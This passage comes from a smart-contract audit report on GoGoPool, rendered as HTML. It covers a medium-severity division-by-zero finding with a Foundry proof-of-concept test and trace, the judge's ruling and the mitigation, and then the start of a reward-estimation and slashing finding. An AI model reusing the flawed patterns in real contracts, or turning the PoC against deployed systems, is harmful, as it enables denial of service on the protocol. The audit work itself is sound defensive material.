class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Distributes GGP to enabled Multisigs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param allotment Total GGP for Multisigs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param vault Vault contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param ggp TokenGGP contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">distributeMultisigAllotment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allotment</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Vault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">TokenGGP</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">MultisigManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mm</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">MultisigManager</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MultisigManager&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">enabledCount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">count</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">enabledMultisigs</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">count</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// there should never be more than a few multisigs, so a loop should be fine here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">count</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">mm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">enabledMultisigs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">enabledCount</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">enabledCount</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Dirty hack to cut unused elements off end of return value (from RP)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// solhint-disable-next-line no-inline-assembly</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">mstore</span><span class=\"mtk1\">(</span><span class=\"mtk12\">enabledMultisigs</span><span class=\"mtk1\">, </span><span class=\"mtk12\">enabledCount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensPerMultisig</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">allotment</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">enabledCount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">enabledMultisigs</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">enabledMultisigs</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokensPerMultisig</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The code distributes the reward to all multisig evenly.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokensPerMultisig</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">allotment</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">enabledCount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>However, if the enabledCount is 0, meaning no multisig wallet is enabled, the transactions revert in division by zero error and revert the startRewardsCycle transaction.</p>\n<p>As shown in POC.</p>\n<p>In RewardsPool.t.sol,</p>\n<p>we change the name from testStartRewardsCycle to testStartRewardsCycle_POC</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L123\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L123</a></p>\n<p>we add the code to disable all multisig wallet. before calling rewardsPool.startRewardsCycle</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L138\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L138</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// disable all multisg wallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ocyticus</span><span class=\"mtk1\">.</span><span class=\"mtk11\">disableAllMultisigs</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>Then we run the test</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">forge</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> -</span><span class=\"mtk12\">vvv</span><span class=\"mtk1\"> --</span><span class=\"mtk12\">match</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testStartRewardsCycle_POC</span></span></span></code></pre>\n<p>the transaction revert in division by zero error, which block the startRewardsCycle</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   ├─ </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MultisigRewardsTransfered</span><span class=\"mtk1\">(</span><span class=\"mtk12\">value</span><span class=\"mtk1\">: </span><span class=\"mtk7\">13499352589262561353689</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   ├─ [</span><span class=\"mtk7\">537</span><span class=\"mtk1\">] Storage::</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xcda836d09bcf3adcec2f52ddddeceac31738a574d5063511c887064e499593df</span><span class=\"mtk1\">) [</span><span class=\"mtk12\">staticcall</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   │   └─ ← MultisigManager: [</span><span class=\"mtk7\">0xA12E9172eB5A8B9054F897cC231Cd7a2751D6D93</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   ├─ [</span><span class=\"mtk7\">1313</span><span class=\"mtk1\">] MultisigManager::</span><span class=\"mtk11\">getCount</span><span class=\"mtk1\">() [</span><span class=\"mtk12\">staticcall</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   │   ├─ [</span><span class=\"mtk7\">549</span><span class=\"mtk1\">] Storage::</span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x778484468bc504108f077f6bf471293e4138c2d117c6f33607855518cf4bda79</span><span class=\"mtk1\">) [</span><span class=\"mtk12\">staticcall</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   │   │   └─ ← </span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   │   └─ ← </span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   ├─ [</span><span class=\"mtk7\">3050</span><span class=\"mtk1\">] MultisigManager::</span><span class=\"mtk11\">getMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) [</span><span class=\"mtk12\">staticcall</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   │   ├─ [</span><span class=\"mtk7\">537</span><span class=\"mtk1\">] Storage::</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xfebe6f39b65f18e050b53df1d0c8d45b8c5cce333324eb048b67b8ee5f26b7a3</span><span class=\"mtk1\">) [</span><span class=\"mtk12\">staticcall</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   │   │   └─ ← RialtoSimulator: [</span><span class=\"mtk7\">0x98D1613BC08756f51f46E841409E61C32f576F2f</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   │   ├─ [</span><span class=\"mtk7\">539</span><span class=\"mtk1\">] Storage::</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x7ef800e7ca09c0c1063313b56290c06f6bc4bae0e9b7af3899bb7d5ade0403c8</span><span class=\"mtk1\">) [</span><span class=\"mtk12\">staticcall</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   │   │   └─ ← </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   │   └─ ← RialtoSimulator: [</span><span class=\"mtk7\">0x98D1613BC08756f51f46E841409E61C32f576F2f</span><span class=\"mtk1\">], </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    │   └─ ← </span><span class=\"mtk8\">&quot;Division or modulo by 0&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    └─ ← </span><span class=\"mtk8\">&quot;Division or modulo by 0&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Test</span><span class=\"mtk1\"> result: </span><span class=\"mtk12\">FAILED</span><span class=\"mtk1\">. </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">passed</span><span class=\"mtk1\">; </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">failed</span><span class=\"mtk1\">; </span><span class=\"mtk12\">finished</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> 11.64</span><span class=\"mtk12\">ms</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Failing</span><span class=\"mtk1\"> tests:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">Encountered</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">failing</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk12\">test</span><span class=\"mtk1\">/</span><span class=\"mtk12\">unit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">RewardsPoolTest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span><span class=\"mtk12\">FAIL</span><span class=\"mtk1\">. </span><span class=\"mtk12\">Reason</span><span class=\"mtk1\">: </span><span class=\"mtk12\">Division</span><span class=\"mtk1\"> </span><span class=\"mtk12\">or</span><span class=\"mtk1\"> </span><span class=\"mtk12\">modulo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">by</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">] </span><span class=\"mtk11\">testStartRewardsCycle_POC</span><span class=\"mtk1\">() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">332890</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the project handle the case when the number of enabled multisig is 0 gracefully to not block the startRewardCycle transaction.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/143\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/143#issuecomment-1412623590\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown a scenario that could cause the call to <code>startRewardsCycle</code> to revert.</p>\n<p>When all multisigs are disabled (or no multisig is added), the division by zero will cause reverts.</p>\n<p>While Admin Privilege is out of scope for this contest, the Warden has identified how a lack of zero-check can cause an open function to revert.</p>\n<p>For this reason, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Prevents division by zero error blocking startRewardCycle(): <a href=\"https://github.com/multisig-labs/gogopool/pull/37\">multisig-labs/gogopool#37</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed, but a new medium severity issue was found. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/46\">hansfriese</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/8\">ladboy233</a>. Also included in Mitigation Review section below.</p>\n<hr>\n<h2 id=\"m-22-inaccurate-estimation-of-validation-rewards-from-function-expectedrewardava-in-minipoolmanagersol\" style=\"position:relative;\"><a href=\"#m-22-inaccurate-estimation-of-validation-rewards-from-function-expectedrewardava-in-minipoolmanagersol\" aria-label=\"m 22 inaccurate estimation of validation rewards from function expectedrewardava in minipoolmanagersol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/122\">[M-22] Inaccurate estimation of validation rewards from function <code>ExpectedRewardAVA</code> in <code>MiniPoolManager.sol</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/122\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/572\">hansfriese</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L560\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L560</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L676\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L676</a></p>\n<p>The validation rewards can be inaccurately displayed to user and the slahsed amount can be wrong when slashing happens.</p>\n<h3 id=\"proof-of-concept-25\" style=\"position:relative;\"><a href=\"#proof-of-concept-25\" aria-label=\"proof of concept 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Note the function below:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @notice Given a duration and an AVAX amt, calculate how much AVAX should be earned via validation rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @param duration The length of validation in seconds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @param avaxAmt The amount of AVAX the node staked for their validation period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @return The approximate rewards the node should recieve from Avalanche for beign a validator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAmt</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ProtocolDAO</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getExpectedAVAXRewardsRate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">avaxAmt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">365</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p>As outlined in the comment section, the function is intended to  calculate how much AVAX should be earned via validation rewards.</p>\n<p>Besides displaying the reward, this function is also used in the function slash.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Slashes the GPP of the minipool with the given index</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev Extracted this because of &quot;stack too deep&quot; errors.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param index Index of the minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">slash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.nodeID&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.owner&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.duration&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 